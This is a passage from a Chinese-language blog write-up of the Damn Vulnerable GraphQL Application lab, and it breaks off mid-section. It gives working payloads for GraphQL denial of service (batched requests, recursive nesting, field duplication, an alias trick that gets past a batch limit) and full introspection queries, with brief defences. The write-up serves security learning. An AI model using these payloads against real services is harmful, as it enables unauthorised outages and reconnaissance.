      
    </entry>
    
    
    
    <entry>
      <title>初探 GraphQL 安全</title>
      <link href="//p/2022/graphql-dvga/"/>
      <url>//p/2022/graphql-dvga/</url>
      
        <content type="html"><![CDATA[<h2 id="GraphQL-是什么"><a href="#GraphQL-是什么" class="headerlink" title="GraphQL 是什么"></a>GraphQL 是什么</h2><p>GraphQL规范早在2012年<sup><a href="https://graphql.org/">[1]</a></sup>已在Facebook的移动端开始使用并在2015年开源，没错，与其说是一种查询语言不如说是一种规范，其嵌入到各种语言中使用，不同语言的实现和使用或多或少都有些许不多，所以觉得说是规范更为合适。</p><p>先来看一种场景，在Facebook中搜索<del>Biden</del>这个用户，点击进去加载主要由3部分组成：姓名头像简介粉丝、发表的内容、各个Posts的点赞评论和评论内容。我们从搜索处点击某个用户即传入的是userId，按照一般Restful API获取数据方式为：根据userId获取姓名简介头像等个人信息，然后在获取该userId下最近发表的内容id，根据每个内容id在获取内容点赞评论信息，一般涉及多个 API 请求接口</p><p><img src="/img/graphql-dvga/VRyV7Jh.png" class="lazyload" data-srcset="/img/graphql-dvga/VRyV7Jh.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="VRyV7Jh"></p><center>https://www.howtographql.com/basics/1-graphql-is-the-better-rest/</center><p>如果是GraphQL，因数据经过图数据结构抽象，只需访问一次接口，即可把想要的数据查询出来</p><p><img src="/img/graphql-dvga/z9VKnHs.png" class="lazyload" data-srcset="/img/graphql-dvga/z9VKnHs.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="z9VKnHs"></p><p>这里性能上的优势就可以体现出来了。</p><p>虽然Restful API也可以做一个接口，根据传入的userId把要查的数据查出来，不过当有其他业务场景需要在这基础上增加返回字段时，那就又需要增加一个接口，加上现在一般是前后端分离架构，后端的修改往往需要与前端协调，这里的每更改一个点涉及的沟通成本、改动引发成本在项目达到一定规模后需要一定的工作量。</p><p>如果前端能够以一种查询方式，不依赖于具体的后端API接口，首先前端不用看后端API接口文档，沟通量也会降低。而且刚刚上述加载视频评论的场景，对于API获取的数据无需在前端做很大的处理，<code>所查即所得</code>，那么在加载性能上，也会有很大的改善～</p><p>于是乎，GraphQL 产生了，它是在数据存储时以把数据转换为图的形式，然后在查的时候就更高效了，还有就是前端在获取数据，调API的时，因为后端的API不是死的，他能以他想获取他仅想要具体的表具体字段，不同表不同字段的数据，查过来也不需要做什么处理，就可以用了。相当于，前端在调API接口的时候，就可以指定具体的数据表和字段，非常方便～</p><h2 id="GraphQL-安全性问题"><a href="#GraphQL-安全性问题" class="headerlink" title="GraphQL 安全性问题"></a>GraphQL 安全性问题</h2><p>相信这时候大家应该也知道，由于GraphQL更多是偏向于前端查询，在配置或编写不当的时候，经常容易出现全局越权或者未授权的情况发生。</p><p>当然也还有其他安全问题，跟进靶场看看先～</p><p><a href="https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application">https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application</a></p><p>插一句，如果没学过GraphQL可以花1小时多丢时间跟着学学写写 <a href="https://www.youtube.com/watch?v=ZQL7tL2S0oQ">https://www.youtube.com/watch?v=ZQL7tL2S0oQ</a> ，不过里面没有提及修改和删除操作，可以尝试自己写一下，熟练一下GraphQL的编写，最后可对比一下靶场中 Python 的写法，这样食用更佳～</p><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p><a href="https://github.com/dolevf/graphw00f">https://github.com/dolevf/graphw00f</a></p><p>找 graphql 路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py -d -t http://tari.local:5000</span><br></pre></td></tr></table></figure><p>识别具体指纹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py -f -t http://tari.local:5000/graphql</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Checking <span class="keyword">if</span> GraphQL is available at http://tari.local:5000/graphql...</span><br><span class="line">[!] Found GraphQL.</span><br><span class="line">[*] Attempting to fingerprint...</span><br><span class="line">[*] Discovered GraphQL Engine: (Graphene)</span><br><span class="line">[!] Attack Surface Matrix: https://github.com/dolevf/graphw00f/blob/main/docs/graphene.md</span><br><span class="line">[!] Technologies: Python</span><br><span class="line">[!] Homepage: https://graphene-python.org</span><br><span class="line">[*] Completed.</span><br></pre></td></tr></table></figure><h2 id="拒绝服务-未限制批处理"><a href="#拒绝服务-未限制批处理" class="headerlink" title="拒绝服务 - 未限制批处理"></a>拒绝服务 - 未限制批处理</h2><p>GraphQL 支持批量查询请求，先简单了解一下 <code>Graphene</code>，nodejs 使用的 apollo 类似，不过 Graphene 是先 <code>core/views.py</code> 注册路由，定义 scheme，对应的 query 有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">node = graphene.relay.Node.Field()</span><br><span class="line">pastes = graphene.<span class="type">List</span>(PasteObject, public=graphene.Boolean())</span><br><span class="line">paste = graphene.Field(PasteObject, p_id=graphene.String())</span><br><span class="line">system_update = graphene.String()</span><br><span class="line">system_diagnostics = graphene.String(username=graphene.String(), password=graphene.String(), cmd=graphene.String())</span><br><span class="line">system_health = graphene.String()</span><br><span class="line">read_and_burn = graphene.Field(PasteObject, p_id=graphene.Int())</span><br></pre></td></tr></table></figure><p>第一关提示为请求 <code>systemUpdate</code> 查询</p><p><a href="https://docs.graphene-python.org/en/latest/types/objecttypes/#resolvers">Graphene 的对应解析为</a> systemUpdate -&gt; resolve_system_update 即最终调用 resolve_system_update 方法，该方法调用 security.simulate_load 这里题目假设这个为高IO处理，所以使用了 sleep 来进行模拟，我们可以适当把 loads 改为 <code>[20, 30, 40, 50]</code> ，重启一下服务。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">simulate_load</span>():</span></span><br><span class="line">  loads = [<span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>]</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  limit = random.choice(loads)</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> count &gt; limit:</span><br><span class="line">      <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>这样单个请求看起来正常点，2-5秒左右。</p><p>然后普通的 query 是在单个花括号的，由于 graphql 支持批处理，可以通过列表包含各个请求，然后 graphql 同时去处理，如果都是些高IO花销请求，那就可以造成DOS了，如</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/graphql</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:5000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.26.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>404</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="json">[&#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;, &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;,&#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;, &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;,&#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;, &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;, &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;query &#123;\n  systemUpdate\n&#125;&quot;</span>, <span class="attr">&quot;variables&quot;</span>: []&#125;]</span></span><br></pre></td></tr></table></figure><p>原先一个只在 2-5秒，这时返回时间变成 25s 左右</p><p>防御方法：</p><p>高 IO schema，限制单次传入次数</p><p>一些参考</p><p><a href="https://www.apollographql.com/blog/apollo-client/performance/batching-client-graphql-queries/">https://www.apollographql.com/blog/apollo-client/performance/batching-client-graphql-queries/</a></p><p><a href="https://lab.wallarm.com/graphql-batching-attack/">https://lab.wallarm.com/graphql-batching-attack/</a></p><h2 id="拒绝服务-深度递归查询"><a href="#拒绝服务-深度递归查询" class="headerlink" title="拒绝服务 - 深度递归查询"></a>拒绝服务 - 深度递归查询</h2><p>在GraphQL中，查询时如果指定的两个类型存在相互引用，那么查询我们去查时就可以无限套娃最终导致指数爆炸</p><p>通过查看代码的数据模型，发现 Owner 和 Paste 存在相互引用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Owner</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">  __tablename__ = <span class="string">&#x27;owners&#x27;</span></span><br><span class="line">  ...</span><br><span class="line">  paste = db.relationship(<span class="string">&#x27;Paste&#x27;</span>, backref=<span class="string">&#x27;Owner&#x27;</span>, lazy=<span class="string">&#x27;dynamic&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Paste</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">  __tablename__ = <span class="string">&#x27;pastes&#x27;</span></span><br><span class="line">  ...</span><br><span class="line">  owner = db.relationship(</span><br><span class="line">    Owner,</span><br><span class="line">    backref=<span class="string">&#x27;pastes&#x27;</span></span><br><span class="line">  )</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>尝试套娃</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    pastes &#123;</span><br><span class="line">        owner &#123;</span><br><span class="line">            paste &#123;</span><br><span class="line">                owner &#123;</span><br><span class="line">                    paste &#123;</span><br><span class="line">                        id</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;errors&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;Cannot query field \&quot;owner\&quot; on type \&quot;PasteObjectConnection\&quot;.&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;locations&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;line&quot;</span>: <span class="number">5</span>,</span><br><span class="line">                    <span class="attr">&quot;column&quot;</span>: <span class="number">17</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找了一下代码，好像没 <code>PasteObjectConnection</code> 这种东西，看了下wp发现要加上 edge 和 node，</p><p><a href="https://stackoverflow.com/questions/42622912/in-graphql-whats-the-meaning-of-edges-and-node">https://stackoverflow.com/questions/42622912/in-graphql-whats-the-meaning-of-edges-and-node</a></p><p>搜了下这两个字段的含义，原来graphql为了处理分页和mutate时做了一种叫 relay 的机制。仔细看我们刚刚到报错提及 <code>Connection</code> ，一个 connection 由对象组成，但我们代码里好像没定义这个东西</p><p><a href="https://docs.graphene-python.org/en/latest/relay/nodes/">https://docs.graphene-python.org/en/latest/relay/nodes/</a></p><p>在看了一下 graphene 文档，发现类中定义了 <code>graphene.relay.Node</code> 即会启用 relay 分页机制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasteObject</span>(<span class="params">SQLAlchemyObjectType</span>):</span></span><br><span class="line">  p_id = graphene.String(source=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">    model = Paste</span><br><span class="line">    interfaces = (graphene.relay.Node, )</span><br></pre></td></tr></table></figure><p>关于 relay 分页机制进一步讲解可以参考：<a href="https://www.apollographql.com/blog/graphql/explaining-graphql-connections/">https://www.apollographql.com/blog/graphql/explaining-graphql-connections/</a></p><p>也就是说，当 <code>pastes</code> 查询访问 <code>paste</code> 类型的 <code>owner</code> 类型时，查询的是 <code>PasteObject</code> 里的 <code>owner</code> ，里面的数据是可以访问的，此时 <code>paste</code> 和 <code>owner</code> 为一个 <code>coneection</code> ，而当进一步查询 <code>owner</code> 类型的 <code>paste</code> 类型时，此时变成查 <code>PasteObjectConnection</code> 的 owner 字段，相当于跨 connection 查询，而 <code>PasteObjectConnection</code> 并没有 <code>owner</code> 这个字段，所以就报错了。</p><p>所以跨 connection 查应该是先查 connection 边连着的 node，就是 owner 里 paste 的 id 了，也就是变成</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    pastes &#123;</span><br><span class="line">        owner &#123;</span><br><span class="line">            paste &#123;</span><br><span class="line">                edges &#123;</span><br><span class="line">                    node &#123;</span><br><span class="line">                        id</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回结果正常</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;pastes&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;owner&quot;</span>: &#123;</span><br><span class="line">                    <span class="attr">&quot;paste&quot;</span>: &#123;</span><br><span class="line">                        <span class="attr">&quot;edges&quot;</span>: [</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="attr">&quot;node&quot;</span>: &#123;</span><br><span class="line">                                    <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;UGFzdGVPYmplY3Q6MQ==&quot;</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        ]</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们的套的层数要足够多，才能让 CPU 飙高，甚至打崩 graphql 服务，这里套了50多层，返回连接超时，但CPU占用不高，也没打崩，（nodejs 可以，不知为啥这里不行了…）</p><h2 id="拒绝服务-资源密集型"><a href="#拒绝服务-资源密集型" class="headerlink" title="拒绝服务 - 资源密集型"></a>拒绝服务 - 资源密集型</h2><p>其实就请求不同的查询接口，看看哪个返回时间更久，然后在去请求时间花销更长的</p><h2 id="拒绝服务-重复字段填充"><a href="#拒绝服务-重复字段填充" class="headerlink" title="拒绝服务 - 重复字段填充"></a>拒绝服务 - 重复字段填充</h2><p>garphql 一般的查询时不会禁用重复字段，即可以填充无限个相同字段，让服务端去处理</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  pastes &#123;</span><br><span class="line">  ipAddr # 1</span><br><span class="line">    ipAddr # 2</span><br><span class="line">    ipAddr # 3</span><br><span class="line">    ipAddr # 4</span><br><span class="line">    ...</span><br><span class="line">    ipAddr # 10,000</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但本机测试，除了延迟，和刚请求那会会有小小波动，好像没啥影响…，不过能检测禁用掉这种请求方式肯定最好，因为这里塞的更多，最终也只会返回一个字段</p><h2 id="拒绝服务-重命名-bypass"><a href="#拒绝服务-重命名-bypass" class="headerlink" title="拒绝服务 - 重命名 bypass"></a>拒绝服务 - 重命名 bypass</h2><p>假如说服务端有对批处理进行限制，但未获取其重命名的在进行限制的话，可通过重命名的方式进行 bypass，这里就算是 expert 模式，也可以通过这个进行 bypass</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  q1 :systemUpdate</span><br><span class="line">  q2 :systemUpdate</span><br><span class="line">  q3 :systemUpdate</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里注意 <code>:</code> 符号要贴着 <code>systemUpdate</code> ，因为靶场在中间件中的获取请求字段的方式为，他根据是否为纯数字字母来进行判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fields_from_query</span>(<span class="params">q</span>):</span></span><br><span class="line">  fields = [k <span class="keyword">for</span> k <span class="keyword">in</span> q.split() <span class="keyword">if</span> k.isalnum()]</span><br><span class="line">  <span class="keyword">return</span> fields</span><br></pre></td></tr></table></figure><p>然后在 graphql 的处理中，是可以正常进行解析的。</p><h2 id="信息泄漏-开启缺省模式"><a href="#信息泄漏-开启缺省模式" class="headerlink" title="信息泄漏 - 开启缺省模式"></a>信息泄漏 - 开启缺省模式</h2><p>缺省查询可以通过指定 <code>__schema</code> 来查询目前所支持的查询方式和查询名称</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  __schema &#123;</span><br><span class="line">    queryType &#123; name &#125;</span><br><span class="line">    mutationType &#123; name &#125;</span><br><span class="line">    subscriptionType &#123; name &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如查询 query 不一定叫做 <code>Query</code> ，修改操作不一定叫做 <code>Mutation</code>，比如在这里，修改操作就叫做 <code>Mutations</code>，所以一般先查 <code>__schema</code>, 然后就可以查看所有数据类型和接口查询方式了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  __type (name: <span class="string">&quot;Query&quot;</span>) &#123;</span><br><span class="line">    name</span><br><span class="line">    fields &#123;</span><br><span class="line">      name</span><br><span class="line">      type &#123;</span><br><span class="line">        name</span><br><span class="line">        kind</span><br><span class="line">        ofType &#123;</span><br><span class="line">          name</span><br><span class="line">          kind</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体某种类型可以通过修改为 <code>__type (name: &quot;PasteObject&quot;)</code> 即可查询 <code>PasteObject</code> 的数据结构，这样还不足以查看 mutation 的访问和 subscription 的访问，可以像下面这样</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">query IntrospectionQuery &#123;</span><br><span class="line">  __schema &#123;</span><br><span class="line">    queryType &#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">    mutationType &#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">    subscriptionType &#123;</span><br><span class="line">      name</span><br><span class="line">    &#125;</span><br><span class="line">    types &#123;</span><br><span class="line">      ...FullType</span><br><span class="line">    &#125;</span><br><span class="line">    directives &#123;</span><br><span class="line">      name</span><br><span class="line">      description</span><br><span class="line">      locations</span><br><span class="line">      args &#123;</span><br><span class="line">        ...InputValue</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fragment FullType on __Type &#123;</span><br><span class="line">  kind</span><br><span class="line">  name</span><br><span class="line">  description</span><br><span class="line">  fields(includeDeprecated: <span class="literal">true</span>) &#123;</span><br><span class="line">    name</span><br><span class="line">    description</span><br><span class="line">    args &#123;</span><br><span class="line">      ...InputValue</span><br><span class="line">    &#125;</span><br><span class="line">    type &#123;</span><br><span class="line">      ...TypeRef</span><br><span class="line">    &#125;</span><br><span class="line">    isDeprecated</span><br><span class="line">    deprecationReason</span><br><span class="line">  &#125;</span><br><span class="line">  inputFields &#123;</span><br><span class="line">    ...InputValue</span><br><span class="line">  &#125;</span><br><span class="line">  interfaces &#123;</span><br><span class="line">    ...TypeRef</span><br><span class="line">  &#125;</span><br><span class="line">  enumValues(includeDeprecated: <span class="literal">true</span>) &#123;</span><br><span class="line">    name</span><br><span class="line">    description</span><br><span class="line">    isDeprecated</span><br><span class="line">    deprecationReason</span><br><span class="line">  &#125;</span><br><span class="line">  possibleTypes &#123;</span><br><span class="line">    ...TypeRef</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fragment InputValue on __InputValue &#123;</span><br><span class="line">  name</span><br><span class="line">  description</span><br><span class="line">  type &#123;</span><br><span class="line">    ...TypeRef</span><br><span class="line">  &#125;</span><br><span class="line">  defaultValue</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fragment TypeRef on __Type &#123;</span><br><span class="line">  kind</span><br><span class="line">  name</span><br><span class="line">  ofType &#123;</span><br><span class="line">    kind</span><br><span class="line">    name</span><br><span class="line">    ofType &#123;</span><br><span class="line">      kind</span><br><span class="line">      name</span><br><span class="line">      ofType &#123;</span><br><span class="line">        kind</span><br><span class="line">        name</span><br><span class="line">        ofType &#123;</span><br><span class="line">          kind</span><br><span class="line">          name</span><br><span class="line">          ofType &#123;</span><br><span class="line">            kind</span><br><span class="line">            name</span><br><span class="line">            ofType &#123;</span><br><span class="line">              kind</span><br><span class="line">              name</span><br><span class="line">              ofType &#123;</span><br><span class="line">                kind</span><br><span class="line">                name</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可参考下链接参考各种语言禁用缺省查询</p><p><a href="https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/">https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/</a></p><h2 id="信息泄漏-开发环境"><a href="#信息泄漏-开发环境" class="headerlink" title="信息泄漏 - 开发环境"></a>信息泄漏 - 开发环境</h2><p>直接访问 <a href="http://tari.local:5000/graphiql">http://tari.local:5000/graphiql</a> ，因为 graphql 有一个集成等开发环境，方便调试用的</p><h2 id="信息泄漏-字段提示"><a href="#信息泄漏-字段提示" class="headerlink" title="信息泄漏 - 字段提示"></a>信息泄漏 - 字段提示</h2><p>当我们输入错误的 